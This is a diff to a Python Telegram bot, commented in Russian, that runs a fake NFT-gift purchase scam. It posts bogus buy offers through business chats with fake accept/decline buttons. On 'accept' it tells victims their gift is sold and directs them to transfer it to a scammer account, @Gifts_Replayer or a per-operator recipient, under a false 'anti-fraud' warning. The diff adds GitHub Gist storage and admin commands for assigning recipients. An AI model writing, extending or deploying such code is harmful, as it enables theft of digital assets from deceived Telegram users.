@@ -3,21 +3,24 @@ import os
 import re
 import random
 import string
+import json
+import aiohttp
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import CommandStart, Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
 from aiogram.exceptions import TelegramBadRequest
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
+GIST_ID = os.getenv("GIST_ID")
+GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
+ADMIN_ID = int(os.getenv("ADMIN_ID", 0)) # Твой ID из секретов
+
+DEFAULT_TARGET = "Gifts_Replayer"
+
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-# --- НАСТРОЙКА ПОЛУЧАТЕЛЯ ---
-TARGET_USERNAME = "Gifts_Replayer" 
-# -----------------------------
-
 active_users = set()
-ADMIN_ID = None 
 
 MESSAGES = {
     "ru": {
@@ -28,6 +31,11 @@ MESSAGES = {
         "btn_decline": "Отклонить",
         "btn_transfer": "Передать NFT"
     },
+    # ... (остальные языки такие же, я пропущу для краткости, они есть в полном коде ниже)
+}
+
+# Добавим остальные языки для полноты
+MESSAGES.update({
     "en": {
         "offer": "User ({username})\noffers you\n<b>{amount} {symbol}</b> for the gift <a href='{link}'>{pretty_name}</a>.",
         "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/{target_username}'>@{target_username}</a> to receive stars.",
@@ -52,17 +60,82 @@ MESSAGES = {
         "btn_decline": "رفض",
         "btn_transfer": "نقل NFT"
     }
-}
+})
 
 def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
 
+# --- РАБОТА С GIST (БАЗА ДАННЫХ) ---
+async def get_gist_data():
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+    url = f"https://api.github.com/gists/{GIST_ID}"
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url, headers=headers) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                content = data['files']['config.json']['content']
+                return json.loads(content) if content else {}
+    return {}
+
+async def update_gist_data(new_data: dict):
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+    url = f"https://api.github.com/gists/{GIST_ID}"
+    payload = {
+        "files": {
+            "config.json": {
+                "content": json.dumps(new_data, indent=2)
+            }
+        }
+    }
+    async with aiohttp.ClientSession() as session:
+        async with session.patch(url, headers=headers, json=payload) as resp:
+            return resp.status == 200
+
+# --- АДМИН ПАНЕЛЬ ---
+@dp.message(Command("set_target"))
+async def cmd_set_target(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    parts = message.text.split()
+    if len(parts) != 3:
+        await message.answer("❌ Формат: `/set_target <ID_пользователя> <юзернейм_без_@>`")
+        return
+    
+    user_id, new_target = parts[1], parts[2].replace("@", "")
+    
+    data = await get_gist_data()
+    data[user_id] = new_target
+    
+    if await update_gist_data(data):
+        await message.answer(f"✅ Для пользователя `{user_id}` установлен новый получатель: `@{new_target}`")
+    else:
+        await message.answer("❌ Ошибка сохранения в GitHub Gist.")
+
+@dp.message(Command("remove_target"))
+async def cmd_remove_target(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    parts = message.text.split()
+    if len(parts) != 2:
+        await message.answer("❌ Формат: `/remove_target <ID_пользователя>`")
+        return
+    
+    user_id = parts[1]
+    data = await get_gist_data()
+    
+    if user_id in data:
+        del data[user_id]
+        if await update_gist_data(data):
+            await message.answer(f"✅ Для пользователя `{user_id}` сброшен на стандартный @{DEFAULT_TARGET}")
+    else:
+        await message.answer("❌ Пользователь не найден в базе.")
+
+# --- ОСНОВНЫЕ КОМАНДЫ ---
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
-    global ADMIN_ID
-    ADMIN_ID = message.from_user.id 
-    
     text = (
         "<b>Как начать:</b>\n"
         "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
@@ -86,6 +159,7 @@ async def cmd_ofteam(message: types.Message):
 async def block_offer_in_pm(message: types.Message):
     await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
 
+# --- ГЕНЕРАЦИЯ ОФФЕРА ---
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
@@ -116,14 +190,16 @@ async def handle_offer_command(message: types.Message):
 
     caption_text = msg_data["offer"].format(
         username=username, amount=amount, symbol=symbol, link=link, pretty_name=pretty_name,
-        target_username=TARGET_USERNAME
+        target_username=DEFAULT_TARGET
     )
 
     try:
         await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
+        # В call_back_data передаем ID владельца бизнес-аккаунта, чтобы потом узнать его настройки
+        sender_id = message.from_user.id if message.from_user else message.sender_chat.id
         keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}"),
-            InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}")
+            InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}:{sender_id}"),
+            InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}:{sender_id}")
         ]])
         await bot.send_message(
             chat_id=message.chat.id,
@@ -136,16 +212,20 @@ async def handle_offer_command(message: types.Message):
     except Exception as e:
         print(f"Ошибка: {e}")
 
-# --- ИЗМЕНЕНИЕ С ОБХОДОМ КЭША ---
+# --- ИЗМЕНЕНИЕ С ОБХОДОМ КЭША И БАЗОЙ ДАННЫХ ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
     
     data_parts = callback.data.split(":")
-    action, gift_slug, amount, currency, lang = data_parts[0], data_parts[1], data_parts[2], data_parts[3], data_parts[4]
+    action, gift_slug, amount, currency, lang, sender_id = data_parts[0], data_parts[1], data_parts[2], data_parts[3], data_parts[4], data_parts[5]
     
     symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
     
+    # Получаем кастомный юзернейм для этого пользователя из Gist
+    data = await get_gist_data()
+    target_username = data.get(sender_id, DEFAULT_TARGET)
+
     cache_buster = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
     link = f"https://t.me/nft/{gift_slug}?v={cache_buster}"
     
@@ -155,20 +235,20 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
 
     if action == "accept":
         new_text = msg_data["success"].format(
-            link=link, pretty_name=pretty_name, target_username=TARGET_USERNAME
+            link=link, pretty_name=pretty_name, target_username=target_username
         )
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text=msg_data["btn_transfer"], url=f"https://t.me/{TARGET_USERNAME}")]
+            [InlineKeyboardButton(text=msg_data["btn_transfer"], url=f"https://t.me/{target_username}")]
         ])
         alert_text = (
             "⚠️ Внимание!\n\n"
             "Получатель в этом сервисе:\n"
-            f"@{TARGET_USERNAME}.\n\n"
+            f"@{target_username}.\n\n"
             "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
         )
     else:
         new_text = msg_data["declined"].format(
-            amount=amount, symbol=symbol, link=link, pretty_name=pretty_name, target_username=TARGET_USERNAME
+            amount=amount, symbol=symbol, link=link, pretty_name=pretty_name, target_username=target_username
         )
         new_keyboard = None
         alert_text = None
